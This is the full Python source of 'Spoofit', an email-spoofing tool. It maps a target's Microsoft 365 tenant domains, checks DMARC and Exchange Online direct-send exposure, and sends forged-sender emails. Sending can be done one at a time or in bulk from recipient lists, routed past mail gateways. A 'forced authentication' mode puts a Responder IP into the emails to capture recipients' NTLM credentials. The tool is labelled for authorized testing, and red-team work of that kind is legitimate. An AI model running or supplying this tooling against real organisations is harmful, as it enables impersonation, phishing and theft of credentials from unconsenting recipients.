#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import sys
import configparser
import csv
import tldextract
import urllib.request
import json
import re
import string
import random
import datetime

# ── Colors ─────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

W = 74  # output width

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# ── Banner ──────────────────────────────────────────────────────────────────
def print_banner():
    print(r"""
   _____                   _____ __
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_
/____/ .___/\____/\____/_/ /_/\__/
    /_/
    """)

# ── API / DNS ───────────────────────────────────────────────────────────────
def get_tenant_info(domain):
    """
    Query azmap.dev for Microsoft tenant info.
    Returns dict with tenant_name, tenant_id, brand_name, related_domains.
    Returns None if domain is not a Microsoft tenant or request fails.
    """
    try:
        url = f"https://azmap.dev/api/tenant?domain={domain}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
            if data.get("tenant_name"):
                return data
    except Exception:
        pass
    return None

def get_eop_hostname(domain):
    return domain.replace(".", "-") + ".mail.protection.outlook.com"

def detect_o365(domain):
    try:
        for rdata in dns.resolver.resolve(domain, "MX"):
            if "mail.protection.outlook.com" in rdata.exchange.to_text().lower():
                return True
    except Exception:
        pass
    try:
        for rdata in dns.resolver.resolve(domain, "TXT"):
            if "spf.protection.outlook.com" in str(rdata).lower():
                return True
    except Exception:
        pass
    return False

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, "MX")
        mx = min(answers, key=lambda r: r.preference).exchange.to_text().strip()
        for rdata in dns.resolver.resolve(mx, "A"):
            return rdata.to_text()
    except Exception as e:
        print(f"  {RED}[!]{RESET} Could not resolve MX for {domain}: {e}")
    return None

def has_mx_record(domain):
    try:
        dns.resolver.resolve(domain, "MX")
        return True
    except Exception:
        return False

def is_subdomain(domain):
    ext = tldextract.extract(domain)
    return domain.lower() != f"{ext.domain}.{ext.suffix}".lower()

# ── Checks (no output — return data only) ──────────────────────────────────
def check_spoofability(domain):
    result = {
        "domain": domain, "policy": "", "spoofable": False,
        "o365": False, "eop_host": "", "eop_ip": None,
        "eop_direct_send": None, "eop_notes": "", "onmicrosoft_domain": ""
    }

    if not has_mx_record(domain):
        result["policy"] = "No MX record"
        return result

    try:
        ans = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
        record = str(ans[0]).lower()
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        record = None
    except Exception:
        record = None

    if record:
        if "p=reject" in record:
            result["policy"] = "p=reject"
        elif "p=quarantine" in record:
            result["policy"] = "p=quarantine"
            result["spoofable"] = True
        elif "p=none" in record:
            result["policy"] = "p=none"
            result["spoofable"] = True
        else:
            result["policy"] = "No p= tag"
            result["spoofable"] = True
    else:
        ext = tldextract.extract(domain)
        org = f"{ext.domain}.{ext.suffix}"
        if org.lower() == domain.lower():
            result["policy"] = "No DMARC"
            result["spoofable"] = True
        else:
            try:
                org_ans = dns.resolver.resolve(f"_dmarc.{org}", "TXT")
                org_rec = str(org_ans[0]).lower()
            except Exception:
                org_rec = None

            if org_rec:
                sp = next((t.split("=",1)[1] for t in org_rec.split() if t.startswith("sp=")), "")
                if sp == "reject":
                    result["policy"] = "No DMARC (org sp=reject)"
                elif sp == "quarantine":
                    result["policy"] = "No DMARC (org sp=quarantine)"
                    result["spoofable"] = True
                elif "p=reject" in org_rec:
                    result["policy"] = "No DMARC (org p=reject, no sp=)"
                    result["spoofable"] = True
                elif "p=quarantine" in org_rec:
                    result["policy"] = "No DMARC (org p=quarantine, no sp=)"
                    result["spoofable"] = True
                else:
                    result["policy"] = "No DMARC"
                    result["spoofable"] = True
            else:
                result["policy"] = "No DMARC"
                result["spoofable"] = True

    return result

def check_eop_direct_send(domain):
    eop_host = get_eop_hostname(domain)
    result = {"eop_host": eop_host, "eop_ip": None, "resolves": False,
              "direct_send_open": False, "notes": ""}

    eop_ip = None
    try:
        eop_ip = dns.resolver.resolve(eop_host, "A")[0].to_text()
        result["resolves"] = True
    except Exception:
        try:
            mx_host = min(dns.resolver.resolve(eop_host, "MX"),
                         key=lambda r: r.preference).exchange.to_text().rstrip(".")
            eop_ip = dns.resolver.resolve(mx_host, "A")[0].to_text()
            result["resolves"] = True
        except Exception:
            return result

    result["eop_ip"] = eop_ip

    try:
        with smtplib.SMTP(timeout=10) as server:
            server.connect(eop_ip, 25)
            server.ehlo_or_helo_if_needed()
            code, msg = server.mail(f"probe@{domain}")
            if code == 250:
                code2, msg2 = server.rcpt(f"probe@{domain}")
                server.rset()
                server.quit()
                m = msg2.decode() if isinstance(msg2, bytes) else str(msg2)
                if code2 == 250:
                    result["direct_send_open"] = True
                    result["notes"] = "MAIL FROM + RCPT TO accepted"
                else:
                    result["notes"] = f"RCPT TO rejected: {m}"
            else:
                m = msg.decode() if isinstance(msg, bytes) else str(msg)
                result["notes"] = f"MAIL FROM rejected: {m}"
    except smtplib.SMTPConnectError as e:
        result["notes"] = f"Connection refused: {e}"
    except Exception as e:
        result["notes"] = f"Probe error: {e}"

    return result

# ── Email ───────────────────────────────────────────────────────────────────
def send_email(smtp_host, sender, recipient, subject, body):
    try:
        date_str = datetime.datetime.now(datetime.timezone.utc).strftime(
            "%a, %d %b %Y %H:%M:%S +0000")
        msg_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        sender_domain = sender.split("@")[1]
        message = (
            f"Date: {date_str}\r\n"
            f"Message-ID: <{msg_id}@{sender_domain}>\r\n"
            f"To: {recipient}\r\nFrom: {sender}\r\nSubject: {subject}\r\n"
            f"MIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n{body}"
        )
        with smtplib.SMTP(smtp_host, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"  {RED}[!]{RESET} Recipient refused {recipient}: {msg}")
                return False
            server.data(message)
            print(f"  {GREEN}[+]{RESET} Sent to {recipient}")
            return True
    except smtplib.SMTPRecipientsRefused:
        print(f"  {RED}[!]{RESET} Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"  {RED}[!]{RESET} SMTP error: {e}")
    return False

def load_config(forced=False):
    cfg_path = os.path.join(SCRIPT_DIR, "conf", "spoofit.conf")
    if not os.path.exists(cfg_path):
        print(f"  {RED}[!]{RESET} Config not found: {cfg_path}")
        return None
    config = configparser.ConfigParser()
    config.read(cfg_path)
    try:
        if forced:
            subject   = config.get("ForcedAuthEmail", "subject")
            body_file = config.get("ForcedAuthEmail", "body_file")
            if not os.path.isabs(body_file):
                body_file = os.path.join(SCRIPT_DIR, body_file)
            with open(body_file) as f:
                body = f.read()
        else:
            subject = config.get("Email", "subject")
            body    = config.get("Email", "body")
        return subject, body
    except Exception as e:
        print(f"  {RED}[!]{RESET} Config error: {e}")
        return None

def create_forced_auth_email(template, responder_ip):
    return template % {"responder": responder_ip}

# ── Display ─────────────────────────────────────────────────────────────────
def risk_label(res):
    if res.get("eop_direct_send"):
        return "CRITICAL", RED
    if res["spoofable"]:
        return ("MEDIUM", YELLOW) if "quarantine" in res["policy"].lower() else ("HIGH", RED)
    if res["policy"] == "No MX record":
        return "N/A", DIM
    return "PROTECTED", GREEN

def print_domain_result(res, n=None, total=None):
    domain  = res["domain"]
    policy  = res["policy"]
    label, color = risk_label(res)
    ctr     = f"[{n}/{total}] " if n is not None else ""

    print(f"\n  {BOLD}{ctr}{domain}{RESET}")
    print(f"  {'─' * (W - 2)}")

    # DMARC row
    p = (policy[:36] + "..") if len(policy) > 38 else policy
    risk_str = f"[{label}]"
    pad = max(0, W - 2 - 10 - len(p) - len(risk_str))
    print(f"  {'DMARC':<8}  {p}{' ' * pad}{color}{risk_str}{RESET}")

    # EOP row
    eop_host = res.get("eop_host", "")
    eop_ip   = res.get("eop_ip")
    eop      = res.get("eop_direct_send")
    notes    = res.get("eop_notes", "")

    if not eop_host:
        pass
    elif not res.get("resolves", eop_ip is not None):
        print(f"  {'EOP':<8}  {DIM}Does not resolve — not Exchange Online{RESET}")
    elif eop is True:
        print(f"  {'EOP':<8}  {eop_host}")
        print(f"  {'':10}{eop_ip}  {RED}{BOLD}→ DIRECT SEND OPEN{RESET}")
    elif eop_ip:
        print(f"  {'EOP':<8}  {eop_host}")
        print(f"  {'':10}{eop_ip}  {GREEN}→ Closed{RESET}")
    elif notes:
        short = notes[:55] + ".." if len(notes) > 57 else notes
        print(f"  {'EOP':<8}  {DIM}{short}{RESET}")

    if res.get("onmicrosoft_domain"):
        print(f"  {'Tenant':<8}  {res['onmicrosoft_domain']}")

def print_summary_table(results):
    if not results:
        return
    print(f"\n{'═' * W}")
    print(f"  {'DOMAIN':<36} {'DMARC':<22} {'RISK':<12} EOP")
    print(f"{'─' * W}")
    for r in results:
        domain = r["domain"]
        policy = r["policy"]
        label, color = risk_label(r)
        eop = r.get("eop_direct_send")
        eop_str   = f"{RED}{BOLD}OPEN{RESET}" if eop is True else (
                    f"{GREEN}Closed{RESET}" if eop is False else "─")
        eop_label = "OPEN" if eop is True else ("Closed" if eop is False else "─")
        d = (domain[:34] + "..") if len(domain) > 36 else domain
        p = (policy[:20] + "..") if len(policy) > 22 else policy
        sys.stdout.write(f"  {d:<36} {p:<22} {color}{label}{RESET}")
        sys.stdout.write(" " * max(0, 12 - len(label)))
        sys.stdout.write(f" {eop_str}\n")
    print(f"{'═' * W}")

def print_critical_findings(results):
    items = []
    for r in results:
        if r.get("eop_direct_send") is True:
            items.append((RED, "EOP DIRECT SEND OPEN", r["domain"],
                f"Bypasses mail gateway via {r['eop_host']}"))
        if r["spoofable"] and "quarantine" not in r["policy"].lower():
            items.append((RED, "SPOOFABLE DOMAIN", r["domain"],
                f"DMARC: {r['policy']}"))
        elif r["spoofable"] and "quarantine" in r["policy"].lower():
            items.append((YELLOW, "DMARC QUARANTINE", r["domain"],
                "Spoofed mail may reach spam folder"))
    if not items:
        print(f"\n  {GREEN}No exploitable findings.{RESET}")
        return
    print(f"\n  {BOLD}FINDINGS{RESET}")
    print(f"{'─' * W}")
    for color, title, domain, detail in items:
        print(f"\n  {color}{BOLD}!! {title}{RESET}")
        print(f"     {domain}")
        print(f"     {DIM}{detail}{RESET}")
    print(f"\n{'─' * W}")

def export_results_csv(results, filename):
    if not results:
        return
    try:
        with open(filename, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["Domain", "DMARC Policy", "Spoofable", "Risk",
                        "O365", "EOP Host", "EOP Direct Send", "EOP Notes",
                        "OnMicrosoft Domain"])
            for r in results:
                label, _ = risk_label(r)
                eop_d = r.get("eop_direct_send")
                w.writerow([
                    r["domain"], r["policy"],
                    "Yes" if r["spoofable"] else "No",
                    label,
                    "Yes" if r.get("o365") else "No",
                    r.get("eop_host", ""),
                    "Open" if eop_d is True else ("Closed" if eop_d is False else "N/A"),
                    r.get("eop_notes", ""),
                    r.get("onmicrosoft_domain", "")
                ])
        print(f"\n  {GREEN}[+]{RESET} Exported to {filename}")
    except Exception as e:
        print(f"  {RED}[!]{RESET} Export error: {e}")

# ── Scan orchestrator ───────────────────────────────────────────────────────
def run_scan(domains):
    """Run DMARC + EOP checks on a list of domains. Returns results list."""
    results = []
    total   = len(domains)
    for n, dom in enumerate(domains, 1):
        # Show progress while checks run (silent functions)
        print(f"  {DIM}checking ({n}/{total}) {dom}...{RESET}", end="\r", flush=True)
        res           = check_spoofability(dom)
        res["o365"]   = detect_o365(dom)
        eop           = check_eop_direct_send(dom)
        res["eop_host"]        = eop["eop_host"]
        res["eop_ip"]          = eop["eop_ip"]
        res["eop_direct_send"] = eop["direct_send_open"]
        res["eop_notes"]       = eop["notes"]
        # Clear progress line before printing result
        print(f"{' ' * W}", end="\r")
        print_domain_result(res, n, total)
        results.append(res)
    return results

# ── Interactive compose / send ──────────────────────────────────────────────
def prompt_compose(results=None):
    """
    Interactive email composer. If scan results are passed, offers EOP endpoints
    as routing options. Otherwise falls back to primary MX lookup.
    """
    print(f"\n  {BOLD}COMPOSE EMAIL{RESET}")
    print(f"  {'─' * 50}")

    eop_candidates = [(r["domain"], r["eop_host"], r["eop_ip"])
                      for r in (results or [])
                      if r.get("eop_direct_send") is True and r.get("eop_ip")]

    smtp_ip   = None
    route_label = ""

    if eop_candidates:
        print(f"\n  EOP direct-send endpoints available:\n")
        for i, (dom, host, ip) in enumerate(eop_candidates, 1):
            print(f"    [{i}] {host}")
            print(f"        {DIM}{ip}  ←  {dom}{RESET}")
        print(f"    [{len(eop_candidates) + 1}] Enter target domain (primary MX)")
        print()
        try:
            pick = input("  Route via: ").strip()
            idx  = int(pick) - 1
            if 0 <= idx < len(eop_candidates):
                dom, host, ip = eop_candidates[idx]
                smtp_ip     = ip
                route_label = f"EOP — {host}"
        except (ValueError, IndexError):
            pass

    if not smtp_ip:
        target = input("  Target domain (MX lookup): ").strip()
        if not target:
            return
        smtp_ip = get_mx_record(target)
        if not smtp_ip:
            return
        route_label = f"MX — {target}"

    print()
    sender    = input("  From (spoofed) : ").strip()
    recipient = input("  To             : ").strip()
    subject   = input("  Subject        : ").strip()

    if not all([sender, recipient, subject]):
        print(f"\n  {YELLOW}Cancelled — required fields missing.{RESET}")
        return

    print(f"\n  Body:")
    print(f"    [1] Security assessment template")
    print(f"    [2] Custom message")
    body_pick = input("\n  > ").strip()

    if body_pick == "1":
        body = (
            "<html><body style='font-family:Arial,sans-serif;color:#333;max-width:600px'>"
            "<p><strong>Security Assessment — Email Delivery Test</strong></p>"
            "<p>This message was sent as part of an authorized security engagement.</p>"
            f"<p>It demonstrates that mail can be delivered via <code>{route_label}</code>"
            f", bypassing any third-party email security gateway your organization has configured.</p>"
            "<p>No action is required. Please forward this to your security team.</p>"
            "</body></html>"
        )
    elif body_pick == "2":
        print(f"\n  Enter body (blank line + '.' to finish):")
        lines = []
        while True:
            line = input("  > ")
            if line.strip() == ".":
                break
            lines.append(line)
        if not lines:
            print(f"  {YELLOW}Cancelled — empty body.{RESET}")
            return
        body = "<br>".join(lines)
    else:
        print(f"  {YELLOW}Cancelled.{RESET}")
        return

    print(f"\n  {'─' * 50}")
    print(f"  From    : {sender}")
    print(f"  To      : {recipient}")
    print(f"  Subject : {subject}")
    print(f"  Via     : {route_label}  ({smtp_ip})")
    print(f"  {'─' * 50}")
    if input("\n  Send? [y/N]: ").strip().lower() == "y":
        send_email(smtp_ip, sender, recipient, subject, body)
    else:
        print(f"  {YELLOW}Cancelled.{RESET}")

def prompt_forced():
    print(f"\n  {BOLD}FORCED AUTHENTICATION{RESET}")
    print(f"  {'─' * 50}\n")
    sender       = input("  From (spoofed) : ").strip()
    recipient    = input("  To             : ").strip()
    responder_ip = input("  Responder IP   : ").strip()
    if not all([sender, recipient, responder_ip]):
        print(f"\n  {YELLOW}Cancelled — required fields missing.{RESET}")
        return
    cfg = load_config(forced=True)
    if not cfg:
        return
    subject, tmpl = cfg
    body  = create_forced_auth_email(tmpl, responder_ip)
    mx    = get_mx_record(sender.split("@")[1])
    if not mx:
        return
    print(f"\n  {'─' * 50}")
    print(f"  From    : {sender}")
    print(f"  To      : {recipient}")
    print(f"  Subject : {subject}")
    print(f"  Via     : MX ({mx})")
    print(f"  {'─' * 50}")
    if input("\n  Send? [y/N]: ").strip().lower() == "y":
        send_email(mx, sender, recipient, subject, body)
    else:
        print(f"  {YELLOW}Cancelled.{RESET}")

# ── Post-scan menu ──────────────────────────────────────────────────────────
def post_scan_menu(results):
    eop_hits = [r for r in results if r.get("eop_direct_send") is True]
    while True:
        print(f"\n  {'─' * 40}")
        print(f"   [1]  Send test email", end="")
        if eop_hits:
            print(f"  {DIM}({len(eop_hits)} EOP endpoint(s) available){RESET}", end="")
        print()
        print(f"   [2]  Export results to CSV")
        print(f"   [3]  New scan")
        print(f"   [m]  Main menu")
        print(f"  {'─' * 40}")
        c = input("   > ").strip().lower()
        if c == "1":
            prompt_compose(results)
        elif c == "2":
            name = input("  Filename [results.csv]: ").strip() or "results.csv"
            export_results_csv(results, name)
        elif c == "3":
            return "scan"
        elif c == "m":
            return "menu"
        else:
            print(f"  {YELLOW}Invalid choice.{RESET}")

# ── Interactive menu flows ──────────────────────────────────────────────────
def menu_check():
    while True:
        print(f"\n  {'─' * 50}")
        target = input("  Target domain: ").strip().lower()
        if not target:
            return

        domains = []
        tenant  = None
        onmicro = ""

        print(f"  {DIM}Looking up tenant...{RESET}", end="\r", flush=True)
        tenant = get_tenant_info(target)
        print(f"{' ' * 40}", end="\r")

        if tenant:
            t_name   = tenant.get("tenant_name", "")
            t_brand  = tenant.get("brand_name") or t_name
            t_id     = tenant.get("tenant_id", "")
            related  = list(tenant.get("related_domains", [target]))
            onmicro  = f"{t_name}.onmicrosoft.com" if t_name else ""

            if onmicro and onmicro not in related:
                related.append(onmicro)
            if target not in related:
                related.insert(0, target)

            print(f"\n  {GREEN}[+]{RESET} {BOLD}{t_brand}{RESET}")
            print(f"      Tenant  : {onmicro}")
            print(f"      ID      : {t_id}")
            print(f"      Domains : {len(related)}")
            print()
            print(f"  [1] Scan all {len(related)} tenant domains")
            print(f"  [2] Scan {target} only")
            print(f"  [b] Back")
            c = input("  > ").strip().lower()
            if c == "1":
                domains = related
            elif c == "2":
                domains = [target]
            elif c == "b":
                return
            else:
                continue
        else:
            print(f"  {DIM}No Microsoft tenant found — scanning {target} only.{RESET}")
            domains = [target]

        brand_str = tenant.get("brand_name", target) if tenant else target
        print(f"\n{'═' * W}")
        print(f"  {BOLD}{brand_str.upper()}{RESET}  —  {len(domains)} domain(s)")
        print(f"{'═' * W}")

        results = run_scan(domains)

        if onmicro:
            for r in results:
                if r["domain"] != onmicro:
                    r["onmicrosoft_domain"] = onmicro

        print_summary_table(results)
        print_critical_findings(results)

        action = post_scan_menu(results)
        if action == "menu":
            return
        # "scan" → loop again

def interactive_menu():
    while True:
        print(f"\n  {'─' * 35}")
        print(f"   [1]  Check domain / tenant")
        print(f"   [2]  Send spoofed email")
        print(f"   [3]  Forced authentication")
        print(f"   [q]  Quit")
        print(f"  {'─' * 35}")
        c = input("   > ").strip().lower()
        if c == "1":
            menu_check()
        elif c == "2":
            prompt_compose()
        elif c == "3":
            prompt_forced()
        elif c in ("q", "quit", "exit"):
            print()
            sys.exit(0)

# ── CLI entrypoint ──────────────────────────────────────────────────────────
def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Spoofit — email spoofability assessment for authorized testing.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "  Interactive mode (no args):    Spoofit.py\n"
            "  Check domain/tenant:           Spoofit.py -t domain.com\n"
            "  Check from file:               Spoofit.py -t domains.txt\n"
            "  Send spoofed email:            Spoofit.py -s from@domain.com -r to@domain.com\n"
            "  Forced auth:                   Spoofit.py -s from@domain.com -r to@domain.com -f responder-ip\n"
            "  Skip tenant expansion:         Spoofit.py -t domain.com --no-expand\n"
        )
    )
    parser.add_argument("-t", "--target",     help="Domain or file of domains to check.")
    parser.add_argument("-o", "--output",     help="Output CSV filename.")
    parser.add_argument("-s", "--sender",     help="Spoofed sender email.")
    parser.add_argument("-r", "--recipients", help="Recipient email or file.")
    parser.add_argument("-f", "--forced",     metavar="RESPONDER_IP",
                                              help="Forced auth — responder IP.")
    parser.add_argument("--no-expand",        action="store_true",
                                              help="Do not expand to full tenant domain list.")
    args = parser.parse_args()

    # No args → interactive
    if not any(vars(args).values()):
        try:
            interactive_menu()
        except KeyboardInterrupt:
            print("\n")
            sys.exit(0)
        return

    # ── CLI check mode ──────────────────────────────────────────────────────
    if args.target:
        domains = []
        tenant  = None
        onmicro = ""

        if os.path.isfile(args.target):
            try:
                with open(args.target) as f:
                    domains = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except Exception as e:
                print(f"  {RED}[!]{RESET} Error reading {args.target}: {e}")
                return
            print(f"  [+] Loaded {len(domains)} domain(s) from {args.target}")
        else:
            domains = [args.target]
            if not args.no_expand:
                print(f"  {DIM}Looking up tenant...{RESET}", end="\r", flush=True)
                tenant = get_tenant_info(args.target)
                print(f"{' ' * 40}", end="\r")
                if tenant:
                    t_name  = tenant.get("tenant_name", "")
                    t_brand = tenant.get("brand_name") or t_name
                    related = list(tenant.get("related_domains", [args.target]))
                    onmicro = f"{t_name}.onmicrosoft.com" if t_name else ""
                    if onmicro and onmicro not in related:
                        related.append(onmicro)
                    if args.target not in related:
                        related.insert(0, args.target)
                    domains = related
                    print(f"  {GREEN}[+]{RESET} Tenant: {BOLD}{t_brand}{RESET}  ({len(domains)} domains)")
                    for d in domains:
                        print(f"       {DIM}· {d}{RESET}")
                else:
                    print(f"  {DIM}No Microsoft tenant found.{RESET}")

        brand = (tenant.get("brand_name") or args.target) if tenant else args.target
        print(f"\n{'═' * W}")
        print(f"  {BOLD}{brand.upper()}{RESET}  —  {len(domains)} domain(s)")
        print(f"{'═' * W}")

        results = run_scan(domains)

        if onmicro:
            for r in results:
                if r["domain"] != onmicro:
                    r["onmicrosoft_domain"] = onmicro

        print_summary_table(results)
        print_critical_findings(results)

        if args.output:
            csv_out = args.output
        elif os.path.isfile(args.target):
            csv_out = os.path.splitext(os.path.basename(args.target))[0] + "_spoofit_results.csv"
        else:
            csv_out = args.target.replace(".", "_") + "_spoofit_results.csv"

        export_results_csv(results, csv_out)
        return

    # ── CLI send mode ───────────────────────────────────────────────────────
    if args.sender and args.recipients:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients) as f:
                recipients = [l.strip() for l in f if l.strip()]
        else:
            recipients = [args.recipients]

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, tmpl = cfg
            body = create_forced_auth_email(tmpl, args.forced)
            print(f"  [*] Forced auth email → {len(recipients)} recipient(s)")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"  [*] Spoofed email → {len(recipients)} recipient(s)")

        mx = get_mx_record(args.sender.split("@")[1])
        if not mx:
            return
        for rcp in recipients:
            send_email(mx, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
